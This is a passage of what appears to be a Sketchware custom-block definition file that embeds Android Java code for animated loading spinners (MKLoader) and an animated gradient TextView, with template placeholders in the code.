android.animation.AnimatorSet();\n\t\t\t\t\tanimatorSet.play(rotateAnimator).with(scaleAnimator);\n\t\t\t\t\tanimatorSet.start();\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tcanvas.save();\n\t\t\t\t\tcanvas.scale(scale, scale, center.x, center.y);\n\t\t\t\t\tcanvas.rotate(rotate, center.x, center.y);\n\t\t\t\t\teye.draw(canvas);\n\t\t\t\t\teyeBound.draw(canvas);\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfSharingan; i++) {\n\t\t\t\t\t\tcanvas.save();\n\t\t\t\t\t\tcanvas.rotate(i * 120, center.x, center.y);\n\t\t\t\t\t\tsharingans[i].draw(canvas);\n\t\t\t\t\t\tcanvas.restore();\n\t\t\t\t\t}\n\t\t\t\t\tcanvas.restore();\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class TwinFishesSpinner extends LoaderView {\n\t\t\t\tprivate Circle[] circles;\n\t\t\t\tprivate int numberOfCircle;\n\t\t\t\tprivate float[] rotates;\n\n\t\t\t\tpublic TwinFishesSpinner() {\n\t\t\t\t\tnumberOfCircle \u003d 10;\n\t\t\t\t\trotates \u003d new float[numberOfCircle];\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tfinal float size \u003d Math.min(width, height);\n\t\t\t\t\tfinal float circleRadius \u003d size / 10.0f;\n\t\t\t\t\tcircles \u003d new Circle[numberOfCircle];\n\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfCircle / 2; i++) {\n\t\t\t\t\t\tcircles[i] \u003d new Circle();\n\t\t\t\t\t\tcircles[i].setCenter(center.x, circleRadius);\n\t\t\t\t\t\tcircles[i].setColor(color);\n\t\t\t\t\t\tcircles[i].setRadius(circleRadius - circleRadius * i / 6);\n\t\t\t\t\t}\n\n\t\t\t\t\tfor (int i \u003d numberOfCircle / 2; i \u003c numberOfCircle; i++) {\n\t\t\t\t\t\tcircles[i] \u003d new Circle();\n\t\t\t\t\t\tcircles[i].setCenter(center.x, size - circleRadius);\n\t\t\t\t\t\tcircles[i].setColor(color);\n\t\t\t\t\t\tcircles[i].setRadius(circleRadius - circleRadius * (i - 5) / 6);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfCircle; i++) {\n\t\t\t\t\t\tfinal int index \u003d i;\n\n\t\t\t\t\t\tandroid.animation.ValueAnimator fadeAnimator \u003d android.animation.ValueAnimator.ofFloat(0, 360);\n\t\t\t\t\t\tfadeAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\t\tfadeAnimator.setDuration(1700);\n\t\t\t\t\t\tfadeAnimator.setStartDelay((index \u003e\u003d 5 ? index - 5 : index) * 100);\n\t\t\t\t\t\tfadeAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\t\trotates[index] \u003d (float)animation.getAnimatedValue();\n\t\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t});\n\n\t\t\t\t\t\tfadeAnimator.start();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfCircle; i++) {\n\t\t\t\t\t\tcanvas.save();\n\t\t\t\t\t\tcanvas.rotate(rotates[i], center.x, center.y);\n\t\t\t\t\t\tcircles[i].draw(canvas);\n\t\t\t\t\t\tcanvas.restore();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class Whirlpool extends LoaderView {\n\t\t\t\tprivate Arc[] arcs;\n\t\t\t\tprivate int numberOfArc;\n\t\t\t\tprivate float[] rotates;\n\n\t\t\t\tpublic Whirlpool() {\n\t\t\t\t\tnumberOfArc \u003d 3;\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tfloat r \u003d Math.min(width, height) / 2f;\n\t\t\t\t\tarcs \u003d new Arc[numberOfArc];\n\t\t\t\t\trotates \u003d new float[numberOfArc];\n\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfArc; i++) {\n\t\t\t\t\t\tfloat d \u003d r / 4 + i * r / 4;\n\t\t\t\t\t\tarcs[i] \u003d new Arc();\n\t\t\t\t\t\tarcs[i].setColor(color);\n\t\t\t\t\t\tarcs[i].setOval(new android.graphics.RectF(center.x - d, center.y - d, center.x + d, center.y + d));\n\t\t\t\t\t\tarcs[i].setStartAngle(i * 45);\n\t\t\t\t\t\tarcs[i].setSweepAngle(i * 45 + 90);\n\t\t\t\t\t\tarcs[i].setStyle(android.graphics.Paint.Style.STROKE);\n\t\t\t\t\t\tarcs[i].setWidth(r / 10f);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tfor (int i \u003d numberOfArc - 1; i \u003e\u003d 0; i--) {\n\t\t\t\t\t\tfinal int index \u003d i;\n\n\t\t\t\t\t\tandroid.animation.ValueAnimator fadeAnimator \u003d android.animation.ValueAnimator.ofFloat(arcs[i].getStartAngle(),\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t   arcs[i].getStartAngle() + 360* (i %2$s 2 \u003d\u003d 0 ? -1 : 1));\n\t\t\t\t\t\tfadeAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\t\tfadeAnimator.setDuration((i + 1) * 500);\n\t\t\t\t\t\tfadeAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\t\trotates[index] \u003d (float)animation.getAnimatedValue();\n\t\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t});\n\n\t\t\t\t\t\tfadeAnimator.start();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfArc; i++) {\n\t\t\t\t\t\tcanvas.save();\n\t\t\t\t\t\tcanvas.rotate(rotates[i], center.x, center.y);\n\t\t\t\t\t\tarcs[i].draw(canvas);\n\t\t\t\t\t\tcanvas.restore();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\n\t\t\tpublic class Worm extends LoaderView {\n\t\t\t\tprivate Circle[] circles;\n\t\t\t\tprivate int circlesSize;\n\t\t\t\tprivate float radius;\n\t\t\t\tprivate int[] transformations;\n\n\t\t\t\tpublic Worm() {\n\t\t\t\t\tcirclesSize \u003d 5;\n\t\t\t\t\ttransformations \u003d new int[]{-2, -1, 0, 1, 2};\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tcircles \u003d new Circle[circlesSize];\n\t\t\t\t\tradius \u003d width / 10f - width / 100f;\n\n\t\t\t\t\tfor (int i \u003d 0; i \u003c circlesSize; i++) {\n\t\t\t\t\t\tcircles[i] \u003d new Circle();\n\t\t\t\t\t\tcircles[i].setColor(color);\n\t\t\t\t\t\tcircles[i].setRadius(radius);\n\t\t\t\t\t\tcircles[i].setCenter(center.x, center.y);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c circlesSize; i++) {\n\t\t\t\t\t\tfinal int index \u003d i;\n\t\t\t\t\t\tandroid.animation.ValueAnimator translateAnimator \u003d android.animation.ValueAnimator.ofFloat(center.y, height / 4f, height * 3 / 4f, center.y);\n\t\t\t\t\t\ttranslateAnimator.setDuration(1000);\n\t\t\t\t\t\ttranslateAnimator.setStartDelay(index * 120);\n\t\t\t\t\t\ttranslateAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\t\ttranslateAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\t\tcircles[index].setCenter(center.x, (float)animation.getAnimatedValue());\n\t\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t});\n\n\t\t\t\t\t\ttranslateAnimator.start();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c circlesSize; i++) {\n\t\t\t\t\t\tcanvas.save();\n\t\t\t\t\t\tcanvas.translate(2 * radius * transformations[i], 0);\n\t\t\t\t\t\tcircles[i].draw(canvas);\n\t\t\t\t\t\tcanvas.restore();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\n\t\t\tpublic abstract class LoaderView {\n\t\t\t\tprotected int color;\n\t\t\t\tprotected int width, height;\n\t\t\t\tprotected int desiredWidth, desiredHeight;\n\t\t\t\tprotected PointF center;\n\t\t\t\tprotected InvalidateListener invalidateListener;\n\n\t\t\t\tpublic LoaderView() {\n\t\t\t\t\tthis.desiredWidth \u003d 150;\n\t\t\t\t\tthis.desiredHeight \u003d 150;\n\t\t\t\t}\n\n\t\t\t\tpublic void setColor(int color) {\n\t\t\t\t\tthis.color \u003d color;\n\t\t\t\t}\n\n\t\t\t\tpublic void setSize(int width, int height) {\n\t\t\t\t\tthis.width \u003d width;\n\t\t\t\t\tthis.height \u003d height;\n\t\t\t\t\tthis.center \u003d new PointF(width / 2.0f, height / 2.0f);\n\t\t\t\t}\n\n\t\t\t\tpublic void setInvalidateListener(InvalidateListener invalidateListener) {\n\t\t\t\t\tthis.invalidateListener \u003d invalidateListener;\n\t\t\t\t}\n\n\t\t\t\tpublic int getDesiredWidth() {\n\t\t\t\t\treturn desiredWidth;\n\t\t\t\t}\n\n\t\t\t\tpublic int getDesiredHeight() {\n\t\t\t\t\treturn desiredHeight;\n\t\t\t\t}\n\n\t\t\t\tpublic abstract void initializeObjects();\n\n\t\t\t\tpublic abstract void setUpAnimation();\n\n\t\t\t\tpublic abstract void draw(android.graphics.Canvas canvas);\n\n\t\t\t\tpublic boolean isDetached() {\n\t\t\t\t\treturn invalidateListener \u003d\u003d null;\n\t\t\t\t}\n\n\t\t\t\tpublic void onDetach() {\n\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\tinvalidateListener \u003d null;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic static class LoaderGenerator {\n\t\t\t\tpublic static LoaderView generateLoaderView(int type) {\n\t\t\t\t\t%1$s aan \u003d new %1$s();\n\t\t\t\t\tswitch (type) {\n\t\t\t\t\t\tcase 0:\n\t\t\t\t\t\t\treturn aan.new ClassicSpinner();\n\t\t\t\t\t\tcase 1:\n\t\t\t\t\t\t\treturn aan.new FishSpinner();\n\t\t\t\t\t\tcase 2:\n\t\t\t\t\t\t\treturn aan.new LineSpinner();\n\t\t\t\t\t\tcase 3:\n\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\treturn aan.new Pulse(3);\n\t\t\t\t\t\t\t} catch (InvalidNumberOfPulseException e) {\n\t\t\t\t\t\t\t\te.printStackTrace();\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\tcase 4:\n\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\treturn aan.new Pulse(4);\n\t\t\t\t\t\t\t} catch (InvalidNumberOfPulseException e) {\n\t\t\t\t\t\t\t\te.printStackTrace();\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\tcase 5:\n\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\treturn aan.new Pulse(5);\n\t\t\t\t\t\t\t} catch (InvalidNumberOfPulseException e) {\n\t\t\t\t\t\t\t\te.printStackTrace();\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\tcase 6:\n\t\t\t\t\t\t\treturn aan.new Radar();\n\t\t\t\t\t\tcase 7:\n\t\t\t\t\t\t\treturn aan.new TwinFishesSpinner();\n\t\t\t\t\t\tcase 8:\n\t\t\t\t\t\t\treturn aan.new Worm();\n\t\t\t\t\t\tcase 9:\n\t\t\t\t\t\t\treturn aan.new Whirlpool();\n\t\t\t\t\t\tcase 10:\n\t\t\t\t\t\t\treturn aan.new PhoneWave();\n\t\t\t\t\t\tcase 11:\n\t\t\t\t\t\t\treturn aan.new Sharingan();\n\t\t\t\t\t\tdefault:\n\t\t\t\t\t\t\treturn aan.new ClassicSpinner();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\tpublic static LoaderView generateLoaderView(String type) {\n\t\t\t\t\t%1$s aan \u003d new %1$s();\n\t\t\t\t\tswitch (type) {\n\t\t\t\t\t\tcase \"ClassicSpinner\":\n\t\t\t\t\t\t\treturn aan.new ClassicSpinner();\n\t\t\t\t\t\tcase \"FishSpinner\":\n\t\t\t\t\t\t\treturn aan.new FishSpinner();\n\t\t\t\t\t\tcase \"LineSpinner\":\n\t\t\t\t\t\t\treturn aan.new LineSpinner();\n\t\t\t\t\t\tcase \"ThreePulse\":\n\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\treturn aan.new Pulse(3);\n\t\t\t\t\t\t\t} catch (InvalidNumberOfPulseException e) {\n\t\t\t\t\t\t\t\te.printStackTrace();\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\tcase \"FourPulse\":\n\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\treturn aan.new Pulse(4);\n\t\t\t\t\t\t\t} catch (InvalidNumberOfPulseException e) {\n\t\t\t\t\t\t\t\te.printStackTrace();\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\tcase \"FivePulse\":\n\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\treturn aan.new Pulse(5);\n\t\t\t\t\t\t\t} catch (InvalidNumberOfPulseException e) {\n\t\t\t\t\t\t\t\te.printStackTrace();\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\tcase \"Radar\":\n\t\t\t\t\t\t\treturn aan.new Radar();\n\t\t\t\t\t\tcase \"TwinFishesSpinner\":\n\t\t\t\t\t\t\treturn aan.new TwinFishesSpinner();\n\t\t\t\t\t\tcase \"Worm\":\n\t\t\t\t\t\t\treturn aan.new Worm();\n\t\t\t\t\t\tcase \"Whirlpool\":\n\t\t\t\t\t\t\treturn aan.new Whirlpool();\n\t\t\t\t\t\tcase \"PhoneWave\":\n\t\t\t\t\t\t\treturn aan.new PhoneWave();\n\t\t\t\t\t\tcase \"Sharingan\":\n\t\t\t\t\t\t\treturn aan.new Sharingan();\n\t\t\t\t\t\tdefault:\n\t\t\t\t\t\t\treturn aan.new ClassicSpinner();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class MKLoader extends View implements InvalidateListener {\n\t\t\t\tprivate int setLoaderType;\n\t\t\t\tprivate int setLoaderColor;\n\t\t\t\tprivate LoaderView loaderView;\n\n\t\t\t\tpublic MKLoader(Context context) {\n\t\t\t\t\tsuper(context);\n\t\t\t\t\tinitialize(context, null, 0);\n\t\t\t\t}\n\n\t\t\t\tpublic MKLoader(Context context, android.util.AttributeSet attrs) {\n\t\t\t\t\tsuper(context, attrs);\n\t\t\t\t\tinitialize(context, attrs, 0);\n\t\t\t\t}\n\n\t\t\t\tpublic MKLoader(Context context, android.util.AttributeSet attrs, int defStyleAttr) {\n\t\t\t\t\tsuper(context, attrs, defStyleAttr);\n\t\t\t\t\tinitialize(context, attrs, defStyleAttr);\n\t\t\t\t}\n\n\t\t\t\tprivate void initialize(Context context, android.util.AttributeSet attrs, int defStyleAttr) {\n\t\t\t\t\t//TypedArray typedArray \u003d context.obtainStyledAttributes(attrs, R.styleable.MKLoader);\n\t\t\t\t\t//int loaderType \u003d typedArray.getInt(R.styleable.MKLoader_mk_type,-1);\n\t\t\t\t\t//int loaderType \u003d -1;\n\t\t\t\t\t//loaderView \u003d LoaderGenerator.generateLoaderView(setLoaderType);\n\t\t\t\t\t//loaderView.setColor(Color.parseColor(\"#ffffff\"));\n\t\t\t\t\t//loaderView.setColor(typedArray.getColor(R.styleable.MKLoader_mk_color, Color.parseColor(\"#ffffff\")));\n\t\t\t\t\t//typedArray.recycle();\n\t\t\t\t}\n\n\t\t\t\tpublic void setType(int _type) {\n\t\t\t\t\tthis.setLoaderType \u003d _type;\n\t\t\t\t\tloaderView \u003d LoaderGenerator.generateLoaderView(setLoaderType);\n\t\t\t\t}\n\t\t\t\tpublic void setColor(int _color) {\n\t\t\t\t\tthis.setLoaderColor \u003d _color;\n\t\t\t\t\tloaderView.setColor(setLoaderColor);\n\t\t\t\t}\n\n\t\t\t\t@Override protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {\n\t\t\t\t\tfinal int measuredWidth \u003d resolveSize(loaderView.getDesiredWidth(), widthMeasureSpec);\n\t\t\t\t\tfinal int measuredHeight \u003d resolveSize(loaderView.getDesiredHeight(), heightMeasureSpec);\n\n\t\t\t\t\tsetMeasuredDimension(measuredWidth, measuredHeight);\n\t\t\t\t}\n\n\t\t\t\t@Override protected void onLayout(boolean changed, int left, int top, int right, int bottom) {\n\t\t\t\t\tsuper.onLayout(changed, left, top, right, bottom);\n\t\t\t\t\tloaderView.setSize(getWidth(), getHeight());\n\t\t\t\t\tloaderView.initializeObjects();\n\t\t\t\t\tloaderView.setUpAnimation();\n\t\t\t\t}\n\n\t\t\t\t@Override protected void onDraw(android.graphics.Canvas canvas) {\n\t\t\t\t\tsuper.onDraw(canvas);\n\t\t\t\t\tloaderView.draw(canvas);\n\t\t\t\t}\n\n\t\t\t\t@Override public void reDraw() {\n\t\t\t\t\tinvalidate();\n\t\t\t\t}\n\n\t\t\t\t@Override protected void onAttachedToWindow() {\n\t\t\t\t\tsuper.onAttachedToWindow();\n\t\t\t\t\tif (loaderView !\u003d null \u0026\u0026 loaderView.isDetached()) {\n\t\t\t\t\t\tloaderView.setInvalidateListener(this);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override protected void onDetachedFromWindow() {\n\t\t\t\t\tsuper.onDetachedFromWindow();\n\t\t\t\t\tif (loaderView !\u003d null) {\n\t\t\t\t\t\tloaderView.onDetach();\n\t\t\t\t\t}\n\t\t\t\t}","color":"#CAC319","name":"MKLoaderLibrary","typeName":"","palette":"44","type":" ","spec":"\u003e\u003e\u003e\u003e\u003e %m.activity % %s.inputOnly MKLoaderLibrary \u003c\u003c\u003c\u003c"},{"code":"{final MKLoader ag \u003d new MKLoader(%2$s.this);\nag.setLayoutParams(new LinearLayout.LayoutParams(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT));\nag.setType(%3$s); //0-11\nag.setColor(%4$s);\n%1$s.addView(ag);}","color":"#CAC319","name":"addMKLoader","typeName":"","palette":"44","type":" ","spec":"%m.view addMKLoader %m.activity type(0-11) %d  color %m.color"},{"code":"}\npublic class AnimatedGradientTextView extends TextView {\n    GradientManager gradientManager;\n    public String fonts;\n    public int[] colors;\n    public int simul;\n    public int angle;\n    public int speed;\n    public int maxFPS;\n    public AnimatedGradientTextView(Context context) {\n        super(context);\n        gradientManager \u003d new GradientManager(this);\n    }\n    public AnimatedGradientTextView(Context context, AttributeSet attrs) {\n        super(context, attrs);\n        gradientManager \u003d new GradientManager(this, colors, simul, angle, speed, maxFPS);\n        CustomFontManager.applyFontFromAttrs(this, fonts);\n    }\n    public AnimatedGradientTextView(Context context, AttributeSet attrs, int defStyle) {\n        super(context, attrs, defStyle);\n        gradientManager \u003d new GradientManager(this, colors, simul, angle, speed, maxFPS);\n        CustomFontManager.applyFontFromAttrs(this, fonts);\n    }\n    @Override\n    protected void onSizeChanged(int w, int h, int oldw, int oldh) {\n        super.onSizeChanged(w, h, oldw, oldh);\n        gradientManager.stopGradient();\n        gradientManager.startGradient();\n    }\n    @Override\n    protected void onVisibilityChanged(View changedView, int visibility) {\n        super.onVisibilityChanged(changedView, visibility);\n        if (visibility \u003d\u003d VISIBLE) {\n            if (getScaleX() !\u003d 0 \u0026\u0026 getScaleY() !\u003d 0) {\n                gradientManager.startGradient();\n            }\n        } else {\n            gradientManager.stopGradient();\n        }\n    }\n    @Override\n    protected void onWindowVisibilityChanged(int visibility) {\n        super.onWindowVisibilityChanged(visibility);\n        if (visibility \u003d\u003d VISIBLE) {\n            if (getScaleX() !\u003d 0 \u0026\u0026 getScaleY() !\u003d 0) {\n                gradientManager.startGradient();\n            }\n        } else {\n            gradientManager.stopGradient();\n        }\n    }\n    @Override\n    public void onScreenStateChanged(int screenState) {\n        super.onScreenStateChanged(screenState);\n        if (screenState \u003d\u003d SCREEN_STATE_OFF) {\n            gradientManager.stopGradient();\n        } else if (screenState \u003d\u003d SCREEN_STATE_ON) {\n            gradientManager.startGradient();\n        }\n    }\n    public void setFonts(String _font) {\n    \tfonts \u003d _font;\n    \tCustomFontManager.applyFontFromAttrs(this, _font);\n    }\n    public void setColorGradients(int[] _color) {\n    \tcolors \u003d _color;\n    \tgradientManager.setColors(_color);\n    }\n    public void setSimultaneousColors(int _sim) {\n    \tsimul \u003d _sim;\n    \tgradientManager.setSimultaneousColors(_sim);\n    }\n    public void setAngle(int _ang) {\n    \tangle \u003d _ang;\n    \tgradientManager.setAngle(_ang);\n    }\n    public void setSpeed(int _spd) {\n    \tspeed \u003d _spd;\n    \tgradientManager.setSpeed(_spd);\n    }\n    public void setMaxFPS(int _fps) {\n    \tmaxFPS \u003d _fps;\n    \tgradientManager.setMaxFPS(_fps);\n    }\n}\n\n\npublic static class CustomFontManager {\n    private static final String FONT_FILE_NAME \u003d \"fonts/\";\n    public static String fonts \u003d \"\";\n    private CustomFontManager() {\n\n    }\n    public static void applyFontFromAttrs(TextView textView, String _fonts) {\n        String fontName \u003d _fonts;\n        if(fontName !\u003d null) {\n            Typeface font \u003d Typeface.createFromAsset(textView.getContext().getAssets(), FONT_FILE_NAME + fontName);\n            textView.setTypeface(font);\n        }\n    }\n    public static void setFonts(String _font) {\n    \tfonts \u003d _font;\n    }\n}\n\n\npublic static class GradientManager {\n    private final TextView textView;\n    public static int[] colors \u003d new int[]{Color.BLUE, Color.RED, Color.GREEN};\n    public static int simultaneousColors \u003d 2;\n    public static int angle \u003d 45;\n    public static int speed \u003d 1000;\n    public static int maxFPS \u003d 24;\n    public static int drawTimeInterval;\n    private GradientRunnable runnable;\n    private java.util.concurrent.ScheduledFuture\u003c?\u003e scheduledFuture \u003d null;\n    private long currentGradientProgress \u003d 0;\n    private static final int ATTR_NOT_FOUND \u003d Integer.MIN_VALUE;\n    public GradientManager(TextView textView) {\n        this.textView \u003d textView;\n        this.initDefaultValues();\n    }\n    public GradientManager(TextView textView, int[] _colors, int _simul, int _angle, int _speed, int _maxFPS) {\n        this.textView \u003d textView;\n        this.initFromAttrsValues(_colors, _simul, _angle, _speed, _maxFPS);\n    }\n    @SuppressWarnings(\"ResourceType\")\n    private void initFromAttrsValues(int[] _colors, int _simul, int _angle, int _speed, int _maxFPS) {\n    \tcolors \u003d _colors;\n        simultaneousColors \u003d _simul;\n        angle \u003d _angle;\n        speed \u003d _speed;\n        maxFPS \u003d _maxFPS;\n        drawTimeInterval \u003d 1000 / maxFPS;\n    }\n    private void initDefaultValues() {\n        colors \u003d colors;\n        simultaneousColors \u003d simultaneousColors;\n        angle \u003d angle;\n        speed \u003d speed;\n        maxFPS \u003d maxFPS;\n        drawTimeInterval \u003d 1000 / maxFPS;\n    }\n    public void stopGradient() {\n        synchronized (this) {\n            if (scheduledFuture !\u003d null) {\n                currentGradientProgress \u003d runnable.getCurrentProgress();\n                scheduledFuture.cancel(true);\n                runnable \u003d null;\n                scheduledFuture \u003d null;\n            }\n        }\n    }\n    public void startGradient() {\n        synchronized (this) {\n            if (scheduledFuture !\u003d null) {\n                return;\n            }\n            final int wf \u003d textView.getWidth();\n            final int hf \u003d textView.getHeight();\n            if (wf \u003e 0 \u0026\u0026 hf \u003e 0) {\n                runnable \u003d new GradientRunnable(textView, colors, simultaneousColors, angle, speed);\n                runnable.setCurrentProgress(currentGradientProgress);\n                java.util.concurrent.ScheduledExecutorService scheduledExecutor \u003d java.util.concurrent.Executors.newSingleThreadScheduledExecutor();\n                scheduledFuture \u003d scheduledExecutor.scheduleAtFixedRate(runnable, 0, drawTimeInterval, java.util.concurrent.TimeUnit.MILLISECONDS);\n            }\n        }\n    }\n    public static void setColors(int[] _col) {\n    \tcolors \u003d _col;\n    }\n    public static void setSimultaneousColors(int _sim) {\n    \tsimultaneousColors \u003d _sim;\n    }\n    public static void setAngle(int _ang) {\n    \tangle \u003d _ang;\n    }\n    public static void setSpeed(int _spd) {\n    \tspeed \u003d _spd;\n    }\n    public static void setMaxFPS(int _fps) {\n    \tmaxFPS \u003d _fps;\n    }\n}\n\n\npublic static class GradientRunnable implements Runnable {\n    private final TextView textView;\n    private int[] colors;\n    private int angle;\n    private int speed;\n    private long totalDelta \u003d 0;\n    private long lastTime \u003d 0;\n    private int[] currentColors;\n    private Point[] gradientsPositions;\n    private int currentGradient \u003d 0;\n    GradientRunnable(TextView textView, int[] colors, int simultaneousColors, int angle, int speed) {\n        this.textView \u003d textView;\n        this.colors \u003d colors;\n        this.angle \u003d angle;\n        this.speed \u003d speed;\n        final int wf \u003d textView.getWidth();\n        final int hf \u003d textView.getHeight();\n        gradientsPositions \u003d getGradientsPoints(wf, hf);\n        currentColors \u003d Arrays.copyOf(colors, simultaneousColors);\n    }\n    @Override\n    public void run() {\n        long currentTime \u003d SystemClock.uptimeMillis();\n        long delta \u003d currentTime - lastTime;\n        totalDelta +\u003d delta;\n        float totalPercentage \u003d totalDelta / ((float) speed);\n        totalPercentage \u003d totalPercentage \u003e 1 ? 1 : totalPercentage;\n        for (int colorIndex \u003d 0; colorIndex \u003c currentColors.length; colorIndex++) {\n            currentColors[colorIndex] \u003d (int) (new ArgbEvaluator().evaluate(totalPercentage, colors[(currentGradient + colorIndex) %1$s colors.length], colors[(currentGradient + (colorIndex + 1)) %1$s colors.length]));\n        }\n        if (totalPercentage \u003d\u003d 1) {\n            totalDelta \u003d 0;\n            currentGradient \u003d (currentGradient + 1) %1$s colors.length;\n        }\n        Shader shader \u003d new LinearGradient(gradientsPositions[0].x, gradientsPositions[0].y, gradientsPositions[1].x, gradientsPositions[1].y, currentColors, null, Shader.TileMode.CLAMP);\n        textView.getPaint().setShader(shader);\n        textView.postInvalidate();\n        lastTime \u003d currentTime;\n    }\n    private Point[] getGradientsPoints(int width, int height) {\n        double angleRadian \u003d Math.toRadians(angle);\n        int circleRadius \u003d width;\n        Point circleCenter \u003d new Point(width / 2, height / 2);\n        Point secantP1 \u003d new Point((int) (circleCenter.x - circleRadius * Math.cos(angleRadian)), (int) (circleCenter.y - circleRadius * Math.sin(angleRadian)));\n        Point secantP2 \u003d new Point((int) (circleCenter.x + circleRadius * Math.cos(angleRadian)), (int) (circleCenter.y + circleRadius * Math.sin(angleRadian)));\n        Point[] intersectPoints \u003d new Point[2];\n        Point topSegmentP1 \u003d new Point(0, 0);\n        Point topSegmentP2 \u003d new Point(width, 0);\n        intersectPoints[0] \u003d MathsUtils.getIntersectionPoint(secantP1, secantP2, topSegmentP1, topSegmentP2);\n        if (intersectPoints[0] \u003d\u003d null) {\n            Point leftSegmentP1 \u003d new Point(0, 0);\n            Point leftSegmentP2 \u003d new Point(0, height);\n            intersectPoints[0] \u003d MathsUtils.getIntersectionPoint(secantP1, secantP2, leftSegmentP1, leftSegmentP2);\n        }\n        Point bottomSegmentP1 \u003d new Point(0, height);\n        Point bottomSegmentP2 \u003d new Point(width, height);\n        intersectPoints[1] \u003d MathsUtils.getIntersectionPoint(secantP1, secantP2, bottomSegmentP1, bottomSegmentP2);\n        if (intersectPoints[1] \u003d\u003d null) {\n            Point rightSegmentP1 \u003d new Point(width, 0);\n            Point rightSegmentP2 \u003d new Point(width, height);\n            intersectPoints[1] \u003d MathsUtils.getIntersectionPoint(secantP1, secantP2, rightSegmentP1, rightSegmentP2);\n        }\n        return intersectPoints;\n    }\n    public long getCurrentProgress() {\n        return totalDelta;\n    }\n    public void setCurrentProgress(long progress) {\n        this.totalDelta \u003d progress;\n    }\n}\n\n\npublic static class MathsUtils {\n    private MathsUtils() {\n    }\n    static Point getIntersectionPoint(Point p1, Point p2, Point p3, Point p4) {\n        int d \u003d (p1.x - p2.x) * (p3.y - p4.y) - (p1.y - p2.y) * (p3.x - p4.x);\n        if (d \u003d\u003d 0) return null;\n        int x \u003d ((p3.x - p4.x) * (p1.x * p2.y - p1.y * p2.x) - (p1.x - p2.x) * (p3.x * p4.y - p3.y * p4.x)) / d;\n        int y \u003d ((p3.y - p4.y) * (p1.x * p2.y - p1.y * p2.x) - (p1.y - p2.y) * (p3.x * p4.y - p3.y * p4.x)) / d;\n        return new 